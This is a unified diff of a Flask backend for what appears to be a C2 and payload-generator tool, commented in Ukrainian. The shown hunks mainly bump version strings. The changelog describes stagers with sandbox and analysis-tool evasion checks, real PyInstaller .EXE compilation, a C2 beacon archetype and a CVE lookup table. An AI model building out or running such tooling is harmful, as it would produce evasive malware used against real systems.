@@ -1,11 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.0
-# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
-# Оновлення v1.8.0:
-#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
-#     - Додано концептуальну перевірку на процеси аналітичних інструментів.
-#     - Додано концептуальну перевірку на хукінг API (Windows).
-#     - Додано концептуальну перевірку активності миші (Windows).
-#   - Оновлено логування для нових технік ухилення.
+# Syntax Flask Backend - Segment SFB-CORE-1.8.1
+# Призначення: Backend на Flask з реальною (за наявності PyInstaller) генерацією .EXE.
+# Оновлення v1.8.1:
+#   - Реалізовано фактичний виклик PyInstaller для формату 'pyinstaller_exe_windows'.
+#   - Додано перевірку наявності PyInstaller в системі.
+#   - Обробка тимчасових файлів та результатів компіляції.
+#   - Покращено логування для процесу компіляції.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -26,12 +25,12 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.0"
+VERSION_BACKEND = "1.8.1"
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.7.9)
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.0)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -64,7 +63,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.9)
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.0)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -132,7 +131,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.7.9)
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True}
 }
-CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.7.8)
+CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = { # Логіка (без змін від v1.8.0)
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
     "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка (HTTP POST з виконанням завдань)", "template_type": "python_stager_http_c2_beacon"},
@@ -645,7 +644,7 @@ app = Flask(__name__)
 CORS(app)
 initialize_simulated_implants_be()
 
-@app.route('/api/generate_payload', methods=['POST']) # Логіка (без змін)
+@app.route('/api/generate_payload', methods=['POST'])
 def handle_generate_payload():
     log_messages = [f"[BACKEND v{VERSION_BACKEND}] Запит /api/generate_payload о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
